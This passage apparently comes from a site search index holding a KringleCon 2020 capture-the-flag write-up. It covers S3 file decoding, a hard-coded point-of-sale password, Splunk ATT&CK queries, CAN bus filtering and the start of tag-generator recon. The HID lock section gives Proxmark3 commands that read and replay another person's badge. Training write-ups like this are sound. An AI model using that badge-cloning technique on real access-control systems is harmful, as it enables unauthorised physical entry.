elf 468 Dec 4 11:04 package.txt.Z.xz.xxd -rw-r--r-- 1 elf elf 415 Dec 4 11:04 package.txt.Z.xz.xxd.tar.bz2 elf@b6192a3b2430:~/bucket_finder/wrapper3000$ file decoded2 decoded2: compress'd data 16 bits elf@b6192a3b2430:~/bucket_finder/wrapper3000$ cat decoded2 | hexdump -C 00000000 1f 9d 90 4e de c8 a1 83 06 04 94 37 6c ca e8 00 |...N.......7l...| 00000010 41 05 4d 19 10 46 e4 bc 99 43 27 4d 19 8a 06 d9 |A.M..F...C'M....| 00000020 84 19 f3 f0 8d 1b 10 45 c2 0c 44 a3 00 |.......E..D..| 0000002d elf@b6192a3b2430:~/bucket_finder/wrapper3000$ mv decoded2 decoded2.Z elf@b6192a3b2430:~/bucket_finder/wrapper3000$ uncompress decoded2.Z elf@b6192a3b2430:~/bucket_finder/wrapper3000$ ls -alt total 32 drwxr-xr-x 2 elf elf 4096 Dec 29 19:31 . -rw-r--r-- 1 elf elf 41 Dec 29 19:24 decoded2 -rw-r--r-- 1 elf elf 621 Dec 29 19:09 decoded -rw-r--r-- 1 elf elf 829 Dec 29 18:55 package drwxr-xr-x 1 elf elf 4096 Dec 29 18:55 .. -rw-r--r-- 1 elf elf 468 Dec 4 11:04 package.txt.Z.xz.xxd -rw-r--r-- 1 elf elf 415 Dec 4 11:04 package.txt.Z.xz.xxd.tar.bz2 elf@b6192a3b2430:~/bucket_finder/wrapper3000$ file decoded2 decoded2: ASCII text elf@b6192a3b2430:~/bucket_finder/wrapper3000$ cat decoded2 North Pole: The Frostiest Place on Earth elf@b6192a3b2430:~/bucket_finder/wrapper3000$","title":"Step 09"},{"location":"challenges/02-investigate-s3-bucket/#flag","text":"North Pole: The Frostiest Place on Earth","title":"Flag"},{"location":"challenges/03-point-of-sale-password-recovery/","text":"Challenge 03 - Point-of-Sale Password Recovery Challenge Difficulty: 1/5 Help Sugarplum Mary in the Courtyard find the supervisor password for the point-of-sale terminal. What's the password? Solution Step 01 Download the binary ( santa-shop.exe ) in a virtual machine and use file to find details about the binary Since file tells us that santa-shop.exe is a Nullsoft Installer self-extracting archive, we can look up how the installer packages the executable's resources and thus avoid dissassembling the binary. Step 02 According to the Wikipedia entry on Nullsoft Scriptable Install System (NSIS) we can use 7-Zip to extract the installation archive Step 03 The directory of interest is $PLUGINSDIR , which according to the Wikipedia entry, contains installation routine plugins. We can look into the directory to see if there are any interesting files app-64.7z looks like an interesting file. We can unzip it with 7z Step 04 7z x app-64.7z extracted a resources directory, which may contains files of interest. Step 05 The resources directory contains an app.asar file, which suggests that the application is an Electron app that was packaged using ASAR. Therefore we can use asar to extract the source code Step 06 The source code directory has the Electron app files, including a README Step 07 The README tells us that the flag is at the top of the main.js file This is why CWE-259: Use of hard-coded passwords is a problem. Flag santapass","title":"Objective 03"},{"location":"challenges/03-point-of-sale-password-recovery/#challenge-03-point-of-sale-password-recovery","text":"","title":"Challenge 03 - Point-of-Sale Password Recovery"},{"location":"challenges/03-point-of-sale-password-recovery/#challenge","text":"Difficulty: 1/5 Help Sugarplum Mary in the Courtyard find the supervisor password for the point-of-sale terminal. What's the password?","title":"Challenge"},{"location":"challenges/03-point-of-sale-password-recovery/#solution","text":"","title":"Solution"},{"location":"challenges/03-point-of-sale-password-recovery/#step-01","text":"Download the binary ( santa-shop.exe ) in a virtual machine and use file to find details about the binary Since file tells us that santa-shop.exe is a Nullsoft Installer self-extracting archive, we can look up how the installer packages the executable's resources and thus avoid dissassembling the binary.","title":"Step 01"},{"location":"challenges/03-point-of-sale-password-recovery/#step-02","text":"According to the Wikipedia entry on Nullsoft Scriptable Install System (NSIS) we can use 7-Zip to extract the installation archive","title":"Step 02"},{"location":"challenges/03-point-of-sale-password-recovery/#step-03","text":"The directory of interest is $PLUGINSDIR , which according to the Wikipedia entry, contains installation routine plugins. We can look into the directory to see if there are any interesting files app-64.7z looks like an interesting file. We can unzip it with 7z","title":"Step 03"},{"location":"challenges/03-point-of-sale-password-recovery/#step-04","text":"7z x app-64.7z extracted a resources directory, which may contains files of interest.","title":"Step 04"},{"location":"challenges/03-point-of-sale-password-recovery/#step-05","text":"The resources directory contains an app.asar file, which suggests that the application is an Electron app that was packaged using ASAR. Therefore we can use asar to extract the source code","title":"Step 05"},{"location":"challenges/03-point-of-sale-password-recovery/#step-06","text":"The source code directory has the Electron app files, including a README","title":"Step 06"},{"location":"challenges/03-point-of-sale-password-recovery/#step-07","text":"The README tells us that the flag is at the top of the main.js file This is why CWE-259: Use of hard-coded passwords is a problem.","title":"Step 07"},{"location":"challenges/03-point-of-sale-password-recovery/#flag","text":"santapass","title":"Flag"},{"location":"challenges/04-operate-the-santavator/","text":"Challenge 04 - Operate the Santavator Challenge Difficulty: 2/5 Talk to Pepper Minstix in the entryway to get some hints about the Santavator. Solution Here's a solutions using 3 christmas lights, 1 hex nut, and 1 broken candy cane:","title":"Objective 04"},{"location":"challenges/04-operate-the-santavator/#challenge-04-operate-the-santavator","text":"","title":"Challenge 04 - Operate the Santavator"},{"location":"challenges/04-operate-the-santavator/#challenge","text":"Difficulty: 2/5 Talk to Pepper Minstix in the entryway to get some hints about the Santavator.","title":"Challenge"},{"location":"challenges/04-operate-the-santavator/#solution","text":"Here's a solutions using 3 christmas lights, 1 hex nut, and 1 broken candy cane:","title":"Solution"},{"location":"challenges/05-open-hid-lock/","text":"Challenge 05 - Open HID Lock Challenge Difficulty: 2/5 Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks for hints on this challenge. You may also visit Fitzy Shortstack in the kitchen for tips. Solution Step 01 After completing some challenges, we picked up a Proxmark3. To get into Santa's workshop, we'll need Santa's ID card (facility code + card UID). Since it doesn't appear as though Santa carries and ID card, we can clone someone else's and increment/decrement the card UID until we get Santa's UID. According to Fitzy Shortstack, Shinny Upatree may have access. Let's try to read Upatree's card by walking up to them and running the following on the Proxmark3: \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2551\u255a\u2550\u2550\u2550\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2554\u2588\u2588\u2588\u2588\u2554\u2588\u2588\u2551 \u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2554\u2550\u2550\u2550\u255d \u2588\u2588\u2551\u255a\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u255a\u2550\u2550\u2588\u2588\u2557 \u2588\u2588\u2551 \u2588\u2588\u2551 \u255a\u2550\u255d \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2554\u255d Iceman \u2615 \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u255d \u2744\ufe0f bleeding edge https://github.com/rfidresearchgroup/proxmark3/ [=] Session log /home/elf/.proxmark3/logs/log_20210107.txt [=] Creating initial preferences file [=] Saving preferences... [+] saved to json file /home/elf/.proxmark3/preferences.json [ Proxmark3 RFID instrument ] [ CLIENT ] client: RRG/Iceman/master/v4.9237-2066-g3de856045 2020-11-25 16:29:31 compiled with GCC 7.5.0 OS:Linux ARCH:x86_64 [ PROXMARK3 ] firmware.................. PM3RDV4 external flash............ present smartcard reader.......... present FPC USART for BT add-on... absent [ ARM ] LF image built for 2s30vq100 on 2020-07-08 at 23: 8: 7 HF image built for 2s30vq100 on 2020-07-08 at 23: 8:19 HF FeliCa image built for 2s30vq100 on 2020-07-08 at 23: 8:30 [ Hardware ] --= uC: AT91SAM7S512 Rev B --= Embedded Processor: ARM7TDMI --= Nonvolatile Program Memory Size: 512K bytes, Used: 304719 bytes (58%) Free: 219569 b ytes (42%) --= Second Nonvolatile Program Memory Size: None --= Internal SRAM Size: 64K bytes --= Architecture Identifier: AT91SAM7Sxx Series --= Nonvolatile Program Memory Type: Embedded Flash Memory [magicdust] pm3 --> lf hid read #db# TAG ID: 2006e22f13 (6025) - Format Len: 26 bit - FC: 113 - Card: 6025 [magicdust] pm3 --> Step 02 We can then go to the workshop's HID lock and send Shinny Upatree's TAG ID to see if we can get access. [magicdust] pm3 --> lf hid sim -r 2006e22f13 [=] Simulating HID tag using raw 2006e22f13 [=] Stopping simulation after 10 seconds. [=] Done [magicdust] pm3 --> As tradition, we are required to say, \"I'm in.\" Turns out Shortstack's HUMINT pulled through.","title":"Objective 05"},{"location":"challenges/05-open-hid-lock/#challenge-05-open-hid-lock","text":"","title":"Challenge 05 - Open HID Lock"},{"location":"challenges/05-open-hid-lock/#challenge","text":"Difficulty: 2/5 Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks for hints on this challenge. You may also visit Fitzy Shortstack in the kitchen for tips.","title":"Challenge"},{"location":"challenges/05-open-hid-lock/#solution","text":"","title":"Solution"},{"location":"challenges/05-open-hid-lock/#step-01","text":"After completing some challenges, we picked up a Proxmark3. To get into Santa's workshop, we'll need Santa's ID card (facility code + card UID). Since it doesn't appear as though Santa carries and ID card, we can clone someone else's and increment/decrement the card UID until we get Santa's UID. According to Fitzy Shortstack, Shinny Upatree may have access. Let's try to read Upatree's card by walking up to them and running the following on the Proxmark3: \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2551\u255a\u2550\u2550\u2550\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2554\u2588\u2588\u2588\u2588\u2554\u2588\u2588\u2551 \u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2554\u2550\u2550\u2550\u255d \u2588\u2588\u2551\u255a\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u255a\u2550\u2550\u2588\u2588\u2557 \u2588\u2588\u2551 \u2588\u2588\u2551 \u255a\u2550\u255d \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2554\u255d Iceman \u2615 \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u255d \u2744\ufe0f bleeding edge https://github.com/rfidresearchgroup/proxmark3/ [=] Session log /home/elf/.proxmark3/logs/log_20210107.txt [=] Creating initial preferences file [=] Saving preferences... [+] saved to json file /home/elf/.proxmark3/preferences.json [ Proxmark3 RFID instrument ] [ CLIENT ] client: RRG/Iceman/master/v4.9237-2066-g3de856045 2020-11-25 16:29:31 compiled with GCC 7.5.0 OS:Linux ARCH:x86_64 [ PROXMARK3 ] firmware.................. PM3RDV4 external flash............ present smartcard reader.......... present FPC USART for BT add-on... absent [ ARM ] LF image built for 2s30vq100 on 2020-07-08 at 23: 8: 7 HF image built for 2s30vq100 on 2020-07-08 at 23: 8:19 HF FeliCa image built for 2s30vq100 on 2020-07-08 at 23: 8:30 [ Hardware ] --= uC: AT91SAM7S512 Rev B --= Embedded Processor: ARM7TDMI --= Nonvolatile Program Memory Size: 512K bytes, Used: 304719 bytes (58%) Free: 219569 b ytes (42%) --= Second Nonvolatile Program Memory Size: None --= Internal SRAM Size: 64K bytes --= Architecture Identifier: AT91SAM7Sxx Series --= Nonvolatile Program Memory Type: Embedded Flash Memory [magicdust] pm3 --> lf hid read #db# TAG ID: 2006e22f13 (6025) - Format Len: 26 bit - FC: 113 - Card: 6025 [magicdust] pm3 -->","title":"Step 01"},{"location":"challenges/05-open-hid-lock/#step-02","text":"We can then go to the workshop's HID lock and send Shinny Upatree's TAG ID to see if we can get access. [magicdust] pm3 --> lf hid sim -r 2006e22f13 [=] Simulating HID tag using raw 2006e22f13 [=] Stopping simulation after 10 seconds. [=] Done [magicdust] pm3 --> As tradition, we are required to say, \"I'm in.\" Turns out Shortstack's HUMINT pulled through.","title":"Step 02"},{"location":"challenges/06-splunk-challenge/","text":"Challenge 06 - Splunk Challenge Challenge The goal is to answer the KingleCastle SOC Challenge Question using Splunk Solution Training Questions Question 01 How many distinct MITRE ATT&CK techniques did Alice emulate? We can use the tstats command in the search interface to list the unique ATT&K events and count the unique ATT&CK technique IDs. We can just pass the following query: | tstats count where index=* by index Flag 13 Question 02 What are the names of the two indexes that contain the results of emulating Enterprise ATT&CK technique 1059.003? (Put them in alphabetical order and separate them with a space) We can use the same query as that for #1, except specify the technique id: | tstats count where index=T1059.003* by index Flag t1059.003-main t1059.003-win Question 03 One technique that Santa had us simulate deals with 'system information discovery'. What is the full name of the registry key that is queried to determine the MachineGuid? We first search Atomic Red Team's repo for an atomic associated with System Information Discovery. Next, we look into the Atomic's details to find the query for Windows MachineGUID Discovery. Flag HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography Question 04 According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.) We can just search the Attack Range's events with a query for \"OSTAP\" and find the earliest execution time in UTC via the fields on the left sidebar. Flag 2020-11-30T17:44:15Z Question 05 One Atomic Red Team test executed by the Attack Range makes use of an open source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component? We first look at frgnca 's Github account to find any repos that may be applicable. AudioDeviceCmdlets seems like a promising repo, as the ability to control audio devices on Windows can be used for malicious purposes. Next, we search Atomic for an ATT&CK technique ID that uses device audio capture commandlets. Then we can send a query string to the Splunk search interface that indexes based on the identified technique id, filters using Event Code 1, searches for a keyword associated with the repo, and sorts the results in ascending order by time: index=T1123* EventCode=1 | search cmdlet | sort + _time Flag 3648 Question 06 Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation? We first search Atomic for an ATT&CK ID for registry run keys. Next we query Splunk, indexing with the ID and filtering the CommandLine field for a .bat : index=t1547.001* \"CommandLine\"=*.bat* . Then we look for a means of finding the .bat source code. Since the executed command downloads the .bat from the following repo, we can just find the repo and scroll down to the last line for the flag. Flag quser Question 07 According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range? We can just query Splunk, filtering sourcetype to bro-issued x509 certificates. We can then add a filter by finding the certificate issuer field on the left side bar, thus filtering the findings with the attack range Windows DC URI. Lastly, we can select the certificate.serial field on the left sidebar to get the serial number. index=* sourcetype=bro:x509* \"certificate.serial\"=* \"certificate.issuer\"=\"CN=win-dc-748.attackrange.local\" Flag 55FCEEBB21270D9249E86F4B9DC7AA60 Challenge Question What is the name of the adversary group that Santa feared would attack KringleCon? After completing the training questions, we're given a base64 encoded ciphertext and two hints: (1) the encryption function is associated with RFC 7465 and (2) one of the Kringlecon talks has the encryption key. Looking up RFC 7465 suggests that we're dealing with RC4. Next, we can go to the talk that's directly related to this challenge and find the key \"Stay Frosty\". Finally, we can use cyberchef to base64 decode the given ciphertext and to pass the return value into an RC4 decoder using the \"Stay Frosty\" passphrase. Flag The Lollipop Guild","title":"Objective 06"},{"location":"challenges/06-splunk-challenge/#challenge-06-splunk-challenge","text":"","title":"Challenge 06 - Splunk Challenge"},{"location":"challenges/06-splunk-challenge/#challenge","text":"The goal is to answer the KingleCastle SOC Challenge Question using Splunk","title":"Challenge"},{"location":"challenges/06-splunk-challenge/#solution","text":"","title":"Solution"},{"location":"challenges/06-splunk-challenge/#training-questions","text":"","title":"Training Questions"},{"location":"challenges/06-splunk-challenge/#question-01","text":"How many distinct MITRE ATT&CK techniques did Alice emulate? We can use the tstats command in the search interface to list the unique ATT&K events and count the unique ATT&CK technique IDs. We can just pass the following query: | tstats count where index=* by index","title":"Question 01"},{"location":"challenges/06-splunk-challenge/#flag","text":"13","title":"Flag"},{"location":"challenges/06-splunk-challenge/#question-02","text":"What are the names of the two indexes that contain the results of emulating Enterprise ATT&CK technique 1059.003? (Put them in alphabetical order and separate them with a space) We can use the same query as that for #1, except specify the technique id: | tstats count where index=T1059.003* by index","title":"Question 02"},{"location":"challenges/06-splunk-challenge/#flag_1","text":"t1059.003-main t1059.003-win","title":"Flag"},{"location":"challenges/06-splunk-challenge/#question-03","text":"One technique that Santa had us simulate deals with 'system information discovery'. What is the full name of the registry key that is queried to determine the MachineGuid? We first search Atomic Red Team's repo for an atomic associated with System Information Discovery. Next, we look into the Atomic's details to find the query for Windows MachineGUID Discovery.","title":"Question 03"},{"location":"challenges/06-splunk-challenge/#flag_2","text":"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography","title":"Flag"},{"location":"challenges/06-splunk-challenge/#question-04","text":"According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.) We can just search the Attack Range's events with a query for \"OSTAP\" and find the earliest execution time in UTC via the fields on the left sidebar.","title":"Question 04"},{"location":"challenges/06-splunk-challenge/#flag_3","text":"2020-11-30T17:44:15Z","title":"Flag"},{"location":"challenges/06-splunk-challenge/#question-05","text":"One Atomic Red Team test executed by the Attack Range makes use of an open source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component? We first look at frgnca 's Github account to find any repos that may be applicable. AudioDeviceCmdlets seems like a promising repo, as the ability to control audio devices on Windows can be used for malicious purposes. Next, we search Atomic for an ATT&CK technique ID that uses device audio capture commandlets. Then we can send a query string to the Splunk search interface that indexes based on the identified technique id, filters using Event Code 1, searches for a keyword associated with the repo, and sorts the results in ascending order by time: index=T1123* EventCode=1 | search cmdlet | sort + _time","title":"Question 05"},{"location":"challenges/06-splunk-challenge/#flag_4","text":"3648","title":"Flag"},{"location":"challenges/06-splunk-challenge/#question-06","text":"Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation? We first search Atomic for an ATT&CK ID for registry run keys. Next we query Splunk, indexing with the ID and filtering the CommandLine field for a .bat : index=t1547.001* \"CommandLine\"=*.bat* . Then we look for a means of finding the .bat source code. Since the executed command downloads the .bat from the following repo, we can just find the repo and scroll down to the last line for the flag.","title":"Question 06"},{"location":"challenges/06-splunk-challenge/#flag_5","text":"quser","title":"Flag"},{"location":"challenges/06-splunk-challenge/#question-07","text":"According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range? We can just query Splunk, filtering sourcetype to bro-issued x509 certificates. We can then add a filter by finding the certificate issuer field on the left side bar, thus filtering the findings with the attack range Windows DC URI. Lastly, we can select the certificate.serial field on the left sidebar to get the serial number. index=* sourcetype=bro:x509* \"certificate.serial\"=* \"certificate.issuer\"=\"CN=win-dc-748.attackrange.local\"","title":"Question 07"},{"location":"challenges/06-splunk-challenge/#flag_6","text":"55FCEEBB21270D9249E86F4B9DC7AA60","title":"Flag"},{"location":"challenges/06-splunk-challenge/#challenge-question","text":"What is the name of the adversary group that Santa feared would attack KringleCon? After completing the training questions, we're given a base64 encoded ciphertext and two hints: (1) the encryption function is associated with RFC 7465 and (2) one of the Kringlecon talks has the encryption key. Looking up RFC 7465 suggests that we're dealing with RC4. Next, we can go to the talk that's directly related to this challenge and find the key \"Stay Frosty\". Finally, we can use cyberchef to base64 decode the given ciphertext and to pass the return value into an RC4 decoder using the \"Stay Frosty\" passphrase.","title":"Challenge Question"},{"location":"challenges/06-splunk-challenge/#flag_7","text":"The Lollipop Guild","title":"Flag"},{"location":"challenges/07-can-d-bus-problem/","text":"Challenge 07 - Solve the Sleigh's CAN-D-BUS Problem Challenge Difficulty: 3/5 Jack Frost is somehow inserting malicious messages onto the sleigh's CAN-D bus. We need you to exclude the malicious messages and no others to fix the sleigh. Visit the NetWars room on the roof and talk to Wunorse Openslae for hints. Solution Testing Idling 244# 00 00 00 00 00 080# 00 00 00 019# 00 00 00 00 188# 00 00 00 00 [REPEATS (244 > 080 > 019 > 188 > 244 > 080 > ...)] After excluding the 4 messages above, we get the slower message: 19B#0000000F2057 with period determined with: EPOCH TIME 1610222200525 1610222203596 1610222208511 Therefore, period = ~4 seconds. Start + Stop Start + RPM increase 02A# 00 FF 00 244# 00 00 00 05 3D 244# 00 00 00 04 0C 244# 00 00 00 03 EF 244# 00 00 00 03 E4 244# 00 00 00 03 E9 244# 00 00 00 03 E7 244# 00 00 00 03 EF 244# 00 00 00 03 E3 244# 00 00 00 03 DE 244# 00 00 00 03 DE 244# 00 00 00 03 EA 244# 00 00 00 03 E1 244# 00 00 00 03 E3 Stop 02A# 00 00 FF Lock + Unlock Lock 19B# 00 00 00 00 00 00 Unlock 19B# 00 00 0F 00 00 00 Accelerate + Brake Accelerator (on stop) [no response] Brake: 35 (on stop) 080# 00 00 23 080# FF FF FA 080# 00 00 23 080# FF FF FD 080# 00 00 23 080# FF FF FA [repeats (00 00 23 > FF FF F_)] Brake: 100 (on stop) [repeats (00 00 64 > FF FF F_)] Steering Steering: 50 (right) (on stop) 019# 00 00 00 31 019# 00 00 00 32 019# 00 00 00 31 019# 00 00 00 33 [repeats (00 00 00 3_)] Steering: 10 (right) (on stop) 019# 00 00 00 09 019# 00 00 00 0A 019# 00 00 00 0A 019# 00 00 00 09 [repeats (00 00 00 0[9|A])] Steering: 1 (right) (on stop) [repeats (00 00 00 01)] Steering: -50 (left) (on stop) 019# FF FF FF CE 019# FF FF FF CE 019# FF FF FF CF 019# FF FF FF D0 019# FF FF FF CD [repeats (FF FF FF [C|D]_)] Steering: -10 (left) (on stop) 019# FF FF FF F7 019# FF FF FF F7 019# FF FF FF F6 [repeats (FF FF FF F[6|7]) Steering: -1 (left) (on stop) [repeats (FF FF FF FF) Accelerate (on start) Accelerate: 1 (on start) 244# 00 00 00 04 32 244# 00 00 00 04 3F [repeats (00 00 00 04 3_)] Accelerate: 10 (on start) 244# 00 00 00 07 04 244# 00 00 00 07 0E [repeats (00 00 00 07 0_)] Accelerate: 100 (on start) 244# 00 00 00 23 60 244# 00 00 00 22 F0 [(repeats (00 00 00 2[2|3] __))] Accelerate + Brake (on start) Accelerate: 10, Brake: 100 (on start) 244# 00 00 00 07 __ 080# 00 00 64 080# FF FF F_ [(repeats the above)] Doesn't appear that the brakes work. Speed doesn't decrease. Findings ---- Start + Stop ---- 02A# 00 FF 00 -- start 02A# 00 00 FF -- stop ---- Lock + Unlock ---- 19B# 00 00 00 00 00 00 -- lock 19B# 00 00 0F 00 00 00 -- unlock ---- Braking ---- 080# 00 00 __ (00 < __ <= 64, increases as braking increases) 080# FF FF F_ ---- Accelerating ---- 244# 00 00 00 __ __ (00 00 < __ __ <= 23 FF, increases as accelerating increases) ---- Steering ---- 019# 00 00 00 __ (01 <= __ <= 33, increases with degree) -- steering right 019# FF FF FF __ (FF <= __ <= CD, decreases with degree) -- steering left ---- Unknown ---- 19B# 00 00 00 0F 20 57 It appears that the problem is that the braking doesn't work -- likely due to the 080# FF FF F_ messages the follows every 080# 00 00 __ message. This message appears to be the result of the unknown message 19B# 00 00 00 0F 20 57 , which suggests a third operation in the Lock + Unlock group that is not lock nor unlock. Flags ID | Operator | Criterion ---------------------------------- 19B | Equals | 00 00 00 0F 20 57 080 | Contains | FF FF F","title":"Objective 07"},{"location":"challenges/07-can-d-bus-problem/#challenge-07-solve-the-sleighs-can-d-bus-problem","text":"","title":"Challenge 07 - Solve the Sleigh's CAN-D-BUS Problem"},{"location":"challenges/07-can-d-bus-problem/#challenge","text":"Difficulty: 3/5 Jack Frost is somehow inserting malicious messages onto the sleigh's CAN-D bus. We need you to exclude the malicious messages and no others to fix the sleigh. Visit the NetWars room on the roof and talk to Wunorse Openslae for hints.","title":"Challenge"},{"location":"challenges/07-can-d-bus-problem/#solution","text":"","title":"Solution"},{"location":"challenges/07-can-d-bus-problem/#testing","text":"","title":"Testing"},{"location":"challenges/07-can-d-bus-problem/#idling","text":"244# 00 00 00 00 00 080# 00 00 00 019# 00 00 00 00 188# 00 00 00 00 [REPEATS (244 > 080 > 019 > 188 > 244 > 080 > ...)] After excluding the 4 messages above, we get the slower message: 19B#0000000F2057 with period determined with: EPOCH TIME 1610222200525 1610222203596 1610222208511 Therefore, period = ~4 seconds.","title":"Idling"},{"location":"challenges/07-can-d-bus-problem/#start-stop","text":"Start + RPM increase 02A# 00 FF 00 244# 00 00 00 05 3D 244# 00 00 00 04 0C 244# 00 00 00 03 EF 244# 00 00 00 03 E4 244# 00 00 00 03 E9 244# 00 00 00 03 E7 244# 00 00 00 03 EF 244# 00 00 00 03 E3 244# 00 00 00 03 DE 244# 00 00 00 03 DE 244# 00 00 00 03 EA 244# 00 00 00 03 E1 244# 00 00 00 03 E3 Stop 02A# 00 00 FF","title":"Start + Stop"},{"location":"challenges/07-can-d-bus-problem/#lock-unlock","text":"Lock 19B# 00 00 00 00 00 00 Unlock 19B# 00 00 0F 00 00 00","title":"Lock + Unlock"},{"location":"challenges/07-can-d-bus-problem/#accelerate-brake","text":"Accelerator (on stop) [no response] Brake: 35 (on stop) 080# 00 00 23 080# FF FF FA 080# 00 00 23 080# FF FF FD 080# 00 00 23 080# FF FF FA [repeats (00 00 23 > FF FF F_)] Brake: 100 (on stop) [repeats (00 00 64 > FF FF F_)]","title":"Accelerate + Brake"},{"location":"challenges/07-can-d-bus-problem/#steering","text":"Steering: 50 (right) (on stop) 019# 00 00 00 31 019# 00 00 00 32 019# 00 00 00 31 019# 00 00 00 33 [repeats (00 00 00 3_)] Steering: 10 (right) (on stop) 019# 00 00 00 09 019# 00 00 00 0A 019# 00 00 00 0A 019# 00 00 00 09 [repeats (00 00 00 0[9|A])] Steering: 1 (right) (on stop) [repeats (00 00 00 01)] Steering: -50 (left) (on stop) 019# FF FF FF CE 019# FF FF FF CE 019# FF FF FF CF 019# FF FF FF D0 019# FF FF FF CD [repeats (FF FF FF [C|D]_)] Steering: -10 (left) (on stop) 019# FF FF FF F7 019# FF FF FF F7 019# FF FF FF F6 [repeats (FF FF FF F[6|7]) Steering: -1 (left) (on stop) [repeats (FF FF FF FF)","title":"Steering"},{"location":"challenges/07-can-d-bus-problem/#accelerate-on-start","text":"Accelerate: 1 (on start) 244# 00 00 00 04 32 244# 00 00 00 04 3F [repeats (00 00 00 04 3_)] Accelerate: 10 (on start) 244# 00 00 00 07 04 244# 00 00 00 07 0E [repeats (00 00 00 07 0_)] Accelerate: 100 (on start) 244# 00 00 00 23 60 244# 00 00 00 22 F0 [(repeats (00 00 00 2[2|3] __))]","title":"Accelerate (on start)"},{"location":"challenges/07-can-d-bus-problem/#accelerate-brake-on-start","text":"Accelerate: 10, Brake: 100 (on start) 244# 00 00 00 07 __ 080# 00 00 64 080# FF FF F_ [(repeats the above)] Doesn't appear that the brakes work. Speed doesn't decrease.","title":"Accelerate + Brake (on start)"},{"location":"challenges/07-can-d-bus-problem/#findings","text":"---- Start + Stop ---- 02A# 00 FF 00 -- start 02A# 00 00 FF -- stop ---- Lock + Unlock ---- 19B# 00 00 00 00 00 00 -- lock 19B# 00 00 0F 00 00 00 -- unlock ---- Braking ---- 080# 00 00 __ (00 < __ <= 64, increases as braking increases) 080# FF FF F_ ---- Accelerating ---- 244# 00 00 00 __ __ (00 00 < __ __ <= 23 FF, increases as accelerating increases) ---- Steering ---- 019# 00 00 00 __ (01 <= __ <= 33, increases with degree) -- steering right 019# FF FF FF __ (FF <= __ <= CD, decreases with degree) -- steering left ---- Unknown ---- 19B# 00 00 00 0F 20 57 It appears that the problem is that the braking doesn't work -- likely due to the 080# FF FF F_ messages the follows every 080# 00 00 __ message. This message appears to be the result of the unknown message 19B# 00 00 00 0F 20 57 , which suggests a third operation in the Lock + Unlock group that is not lock nor unlock.","title":"Findings"},{"location":"challenges/07-can-d-bus-problem/#flags","text":"ID | Operator | Criterion ---------------------------------- 19B | Equals | 00 00 00 0F 20 57 080 | Contains | FF FF F","title":"Flags"},{"location":"challenges/08-broken-tag-generator/","text":"Challenge 08 - Broken Tag Generator Challenge Difficulty: 4/5 Help Noel Boetie fix the Tag Generator in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this. Solution Recon Step 01 Let's start with finding some info about https://tag-generator.kringlecastle.com root@kali:~/kringlecon20/challenges/08-broken-tag-generator# ping https://tag-generator.kringlecastle.com/ ping: https://tag-generator.kringlecastle.com/: Name or service not known root@kali:~/kringlecon20/challenges/08-broken-tag-generator# dig @8.8.8.8 https://tag-generator.kringlecastle.com/ ; <<>> DiG 9.16.8-Debian <<>> @8.8.8.8 https://tag-generator.kringlecastle.com/ ; (1 server found) ;; global options: +cmd ;; Got answer: ;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 44841 ;; flags: qr rd ra ad; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ; COOKIE: dffe19b9049e3c2e5f6a443a5ffa54852a0e11faf92a208e (good) ;; QUESTION SECTION: ;https://tag-generator.kringlecastle.com/. IN A ;; AUTHORITY SECTION: . 600 IN SOA a.root-servers.net. nstld.verisign-grs.com. 2021010901 1800 900 604800 86400 ;; Query time: 16 msec ;; SERVER: 8.8.8.8#53(8.8.8.8) ;; WHEN: Sat Jan 09 20:12:37 EST 2021 ;; MSG SIZE rcvd: 172 root@kali:~/kringlecon20/challenges/08-broken-tag-generator# nmap 35.232.236.115:443 # received from browser Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-09 18:00 PST Failed to resolve \"35.232.236.115:443\". WARNING: No targets were specified, so 